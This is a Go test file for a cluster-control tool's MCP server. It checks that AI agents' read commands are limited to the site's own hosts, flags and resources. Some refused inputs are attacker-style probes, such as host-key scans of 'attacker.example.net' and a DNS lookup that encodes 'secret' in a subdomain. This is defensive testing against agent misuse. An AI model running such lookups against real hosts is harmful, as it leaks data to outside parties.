// SPDX-FileCopyrightText: 2026 GSI Helmholtz Centre for Heavy Ion Research GmbH <http://www.gsi.de>
// SPDX-License-Identifier: LGPL-3.0-or-later

package mcpserver_test

import (
	"context"
	"fmt"
	"strings"
	"sync"
	"testing"

	"github.com/spf13/cobra"

	"github.com/GSI-HPC/clusterctl/internal/app"
	"github.com/GSI-HPC/clusterctl/internal/config"
	"github.com/GSI-HPC/clusterctl/internal/exitcode"
	"github.com/GSI-HPC/clusterctl/internal/safety"
	"github.com/GSI-HPC/clusterctl/internal/transport"
)

type commandResult struct {
	Command   string `json:"command"`
	ExitCode  int    `json:"exitCode"`
	Error     string `json:"error"`
	Output    any    `json:"output"`
	Notes     string `json:"notes"`
	Truncated bool   `json:"truncated"`
}

// 1.8: a read command connects to the nodes it is given, so an agent could
// point hostkey scan or dns lookup at any host the workstation reaches. Only
// the site's own hosts are offered: nodes of the inventory, and names in the
// site's domains.
func TestReadCommandReachesOnlyTheSitesHosts(t *testing.T) {
	f := start(t, setup{})
	for _, args := range [][]string{
		{"hostkey", "scan", "-n", "attacker.example.net"},
		{"hostkey", "verify", "attacker.example.net"},
		{"dns", "lookup", "-n", "c2VjcmV0.attacker.example.net"},
		{"node", "hw", "-n", "exe1,192.0.2.1"},
		{"dns", "lookup", "-n", "example.org"},
		{"dns", "lookup", "-n", "evil-example.org"},
	} {
		msg := f.refused(t, "read_command", map[string]any{"args": args})
		if !strings.HasPrefix(msg, "rejected:") || !strings.Contains(msg, "not a host of the site") {
			t.Errorf("%v: message = %q, want it refused as not a host of the site", args, msg)
		}
	}
	if sent := f.cluster.sent(); len(sent) != 0 {
		t.Errorf("a refused command sent %v", sent)
	}

	// The site's own names still work, in every spelling.
	var out commandResult
	for _, args := range [][]string{
		{"node", "fqdn", "-n", "exe1"},
		{"node", "fqdn", "-n", "exe0001.hpc.example.org"},
		{"node", "fqdn", "-n", "ghost1"},
		{"node", "fqdn", "-n", "@rack:R02"},
	} {
		f.call(t, "read_command", map[string]any{"args": args}, &out)
		if out.ExitCode != 0 {
			t.Errorf("%v: result = %+v", args, out)
		}
	}
}

// 1.8: a timeout only shortens the wait for a host; an agent cannot make a
// read command wait on a host for longer than it would by default.
func TestReadCommandCapsTheTimeout(t *testing.T) {
	f := start(t, setup{})
	msg := f.refused(t, "read_command", map[string]any{"args": []string{"hostkey", "scan", "--timeout", "1h", "-n", "exe1"}})
	if !strings.HasPrefix(msg, "rejected:") || !strings.Contains(msg, "--timeout") {
		t.Errorf("message = %q, want --timeout refused", msg)
	}
	var out commandResult
	f.call(t, "read_command", map[string]any{"args": []string{"hostkey", "scan", "--timeout", "2s", "-n", "exe1"}}, &out)
	if strings.Contains(out.Error, "--timeout") {
		t.Errorf("a shorter timeout was refused: %+v", out)
	}
}

// 10.8: CLUSTERCTL_NODES is a default for the administrator's shell, not a
// node set for the agent: a node command that names no nodes selects none.
func TestReadCommandIgnoresTheNodesVariable(t *testing.T) {
	t.Setenv(config.EnvNodes, "exe[1-10],sub[1-2]")
	f := start(t, setup{})
	msg := f.refused(t, "read_command", map[string]any{"args": []string{"node", "hw"}})
	if !strings.HasPrefix(msg, "rejected:") || !strings.Contains(msg, "no nodes were selected") {
		t.Errorf("message = %q, want nothing selected", msg)
	}
	if sent := f.cluster.sent(); len(sent) != 0 {
		t.Errorf("node hw without nodes sent %v", sent)
	}
}

// No progress is drawn for an agent: CLUSTERCTL_PROGRESS in the server's
// environment asks for a counter no agent could see, and is not read, so
// the command neither fails for want of a terminal nor writes into the
// notes.
func TestReadCommandIgnoresTheProgressVariable(t *testing.T) {
	t.Setenv(config.EnvProgress, "counter")
	f := start(t, setup{})
	var out commandResult
	f.call(t, "read_command", map[string]any{"args": []string{"node", "fqdn", "-n", "exe1"}}, &out)
	if out.ExitCode != 0 || out.Notes != "" {
		t.Errorf("result = %+v, want success and no notes", out)
	}
}

// 10.11: --fanout would override fanout.max, which --set may not.
func TestReadCommandPinsTheFanout(t *testing.T) {
	f := start(t, setup{})
	for _, args := range [][]string{
		{"node", "hw", "--fanout", "100000", "-n", "exe[1-10]"},
		{"--fanout=100000", "node", "hw", "-n", "exe[1-10]"},
	} {
		msg := f.refused(t, "read_command", map[string]any{"args": args})
		if !strings.HasPrefix(msg, "rejected:") || !strings.Contains(msg, "--fanout") {
			t.Errorf("%v: message = %q, want --fanout refused", args, msg)
		}
	}
	if sent := f.cluster.sent(); len(sent) != 0 {
		t.Errorf("sent %v", sent)
	}
}

// tree builds a command tree with one read command that runs fn.
func tree(fn func(cmd *cobra.Command) error) func(context.Context, app.Streams) *cobra.Command {
	return func(_ context.Context, streams app.Streams) *cobra.Command {
		root := &cobra.Command{Use: "clusterctl", SilenceUsage: true, SilenceErrors: true}
		flags := root.PersistentFlags()
		flags.StringSlice("config", nil, "")
		flags.String("context", "", "")
		flags.StringArray("set", nil, "")
		flags.StringP("output", "o", "", "")
		root.AddCommand(&cobra.Command{
			Use:         "probe",
			Annotations: map[string]string{safety.EffectAnnotation: string(safety.EffectRead)},
			RunE:        func(cmd *cobra.Command, _ []string) error { return fn(cmd) },
		})
		root.SetOut(streams.Out)
		root.SetErr(streams.Err)
		return root
	}
}

// 10.2: a panic in a tool is a failed call, not the end of the server and of
// every plan waiting in it.
func TestAPanicInAToolFailsOnlyThatCall(t *testing.T) {
	f := start(t, setup{
		answer: accept(map[string]any{"confirm": true}),
		command: tree(func(*cobra.Command) error {
			panic("slice bounds out of range [1:0]")
		}),
	})
	p := f.plan(t, map[string]any{"action": "resume", "nodes": "exe1"})
	msg := f.refused(t, "read_command", map[string]any{"args": []string{"probe"}})
	if !strings.HasPrefix(msg, "failed:") || !strings.Contains(msg, "panic") {
		t.Errorf("message = %q, want the panic reported as a failure", msg)
	}
	var out applyResult
	f.call(t, "apply_plan", applyArgs(p), &out)
	if !out.Applied {
		t.Errorf("the plan made before the panic = %+v, want it applied", out)
	}
}

// lockedBuffer is a log that several goroutines may write to at once.
type lockedBuffer struct {
	mu  sync.Mutex
	buf strings.Builder
}

func (b *lockedBuffer) Write(p []byte) (int, error) {
	b.mu.Lock()
	defer b.mu.Unlock()
	return b.buf.Write(p)
}

func (b *lockedBuffer) String() string {
	b.mu.Lock()
	defer b.mu.Unlock()
	return b.buf.String()
}

// A panic in a fan-out worker is out of reach of the handler's recover,
// since it happens in another goroutine, and it ended the server with
// every plan it held. It is that node's failure now, the call fails, and
// the server answers the next one. The stack goes to the server's log, not
// to the agent.
func TestAPanicInAFanOutFailsOnlyThatCall(t *testing.T) {
	log := &lockedBuffer{}
	f := start(t, setup{
		log:    log,
		answer: accept(map[string]any{"confirm": true}),
		runner: func(next transport.Runner) transport.Runner {
			return runnerFunc(func(ctx context.Context, target transport.Target, req transport.Request) (*transport.Result, error) {
				if target.Name == "exe0002" {
					panic("index out of range [3] with length 3")
				}
				return next.Run(ctx, target, req)
			})
		},
	})
	p := f.plan(t, map[string]any{"action": "resume", "nodes": "exe1"})
	var got commandResult
	f.call(t, "read_command", map[string]any{"args": []string{"node", "hw", "-n", "exe[1-3]", "-o", "json"}}, &got)
	if got.ExitCode != exitcode.TargetFailed {
		t.Errorf("exit code = %d, want %d (%s)", got.ExitCode, exitcode.TargetFailed, got.Error)
	}
	rows, _ := got.Output.([]any)
	status := map[string]any{}
	for _, row := range rows {
		if r, ok := row.(map[string]any); ok {
			status[fmt.Sprint(r["node"])] = r["status"]
		}
	}
	for node, want := range map[string]string{"exe0001": "ok", "exe0002": "failed", "exe0003": "ok"} {
		if status[node] != want {
			t.Errorf("%s: status %v, want %s; output: %v", node, status[node], want, got.Output)
		}
	}
	if strings.Contains(got.Notes, "goroutine") {
		t.Errorf("the stack of the panic reached the agent:\n%s", got.Notes)
	}
	if !strings.Contains(log.String(), "panic while working on exe0002") {
		t.Errorf("the stack of the panic is not in the server's log:\n%s", log)
	}
	var out applyResult
	f.call(t, "apply_plan", applyArgs(p), &out)
	if !out.Applied {
		t.Errorf("the plan made before the panic = %+v, want it applied", out)
	}
}

// 10.2: a command that keeps printing is stopped once its output passes the
// bound, instead of being buffered until the workstation runs out of memory.
func TestReadCommandStopsACommandThatKeepsPrinting(t *testing.T) {
	written := 0
	f := start(t, setup{command: tree(func(cmd *cobra.Command) error {
		chunk := []byte(strings.Repeat("x", 4096))
		for written < 256<<20 {
			if err := cmd.Context().Err(); err != nil {
				return err
			}
			n, err := cmd.OutOrStdout().Write(chunk)
			written += n
			if err != nil {
				return err
			}
		}
		return nil
	})})
	var out commandResult
	f.call(t, "read_command", map[string]any{"args": []string{"probe"}}, &out)
	if !out.Truncated {
		t.Errorf("result = %+v, want it cut", out)
	}
	if written > 1<<20 {
		t.Errorf("the command wrote %d bytes before it was stopped", written)
	}
}

// 10.2: the same through the real command tree, with a jq program that
// never ends.
func TestReadCommandStopsAnEndlessJQProgram(t *testing.T) {
	f := start(t, setup{})
	var out commandResult
	f.call(t, "read_command", map[string]any{"args": []string{"version", "-o", `jq=repeat("xxxxxxxx")`}}, &out)
	if !out.Truncated {
		t.Errorf("result = %+v, want it cut", out)
	}
}

// cobra's help and completion commands are part of the tree from the start,
// and only read, but they are the shell's, not the cluster's: an agent is not
// offered them, and a completion script is not written into the protocol.
func TestReadCommandOffersNoShellBuiltins(t *testing.T) {
	f := start(t, setup{})
	for _, args := range [][]string{
		{"help"},
		{"help", "node", "list"},
		{"completion", "bash"},
		{"completion"},
	} {
		msg := f.refused(t, "read_command", map[string]any{"args": args})
		if !strings.HasPrefix(msg, "rejected:") {
			t.Errorf("%v: message = %q, want it rejected", args, msg)
		}
		for _, offered := range []string{"  help", "  completion"} {
			if strings.Contains(msg, offered) {
				t.Errorf("%v: the commands offered include %q:\n%s", args, strings.TrimSpace(offered), msg)
			}
		}
	}
}
